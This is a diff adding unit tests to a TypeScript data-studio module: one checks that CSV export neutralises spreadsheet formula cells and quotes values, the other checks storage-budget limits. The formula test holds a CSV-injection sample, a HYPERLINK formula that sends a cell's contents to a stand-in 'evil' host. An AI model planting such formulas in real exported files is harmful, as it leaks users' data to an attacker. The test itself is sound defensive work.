@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { addTransform, altText, clean, describeColumn, importCsv, interpretationGaps, methodsFor, methodsWriteUp, readDataProjects, type DataProject } from './data';
+import { addTransform, altText, clean, DATA_BUDGET, describeColumn, fits, importCsv, MAX_RAW, toCsv, interpretationGaps, methodsFor, methodsWriteUp, readDataProjects, type DataProject } from './data';
 
 const now = new Date('2026-09-27T12:00:00Z');
 
@@ -74,5 +74,27 @@ describe('data studio', () => {
 
   it('refuses stored data claiming a regulated tier', () => {
     expect(() => readDataProjects([{ ...project(), tier: 'T4' }])).toThrow();
+  });
+
+  it('neutralises formula cells in the CSV export and quotes what needs quoting', () => {
+    const csv = toCsv({ headers: ['name', '=cmd'], rows: [['Ada', '=HYPERLINK("http://evil/?"&A2,"x")'], ['Bob', '+SUM(1;2)'], ['Cy', '@x'], ['Di', '-2'], ['Ed', '\tx'], ['Fa', 'a\rb'], ['Gi', 'plain']] });
+    const lines = csv.split('\n');
+    expect(lines[0]).toBe("name,'=cmd");
+    expect(lines[1]).toBe(`Ada,"'=HYPERLINK(""http://evil/?""&A2,""x"")"`);
+    expect(lines[2]).toBe("Bob,'+SUM(1;2)");
+    expect(lines[3]).toBe("Cy,'@x");
+    expect(lines[4]).toBe("Di,'-2");
+    expect(lines[5]).toBe("Ed,'\tx");
+    expect(csv).toContain(`Fa,"a\rb"`);
+    expect(lines.at(-1)).toBe('Gi,plain');
+  });
+
+  it('keeps the library inside its storage budget', () => {
+    expect(importCsv('d', 'x', 'a\n' + '1\n'.repeat(MAX_RAW), 'T2', now).ok).toBe(false);
+    const quoted = importCsv('d', 'x', 'a\n' + '"q",\n'.repeat(Math.floor((MAX_RAW - 2) / 5)), 'T2', now);
+    if (!quoted.ok) throw new Error(quoted.reason);
+    expect(fits([quoted.project])).toBe(true);
+    expect(fits([quoted.project, { ...quoted.project, id: 'e' }, { ...quoted.project, id: 'f' }])).toBe(false);
+    expect(JSON.stringify([quoted.project]).length).toBeLessThanOrEqual(DATA_BUDGET);
   });
 });
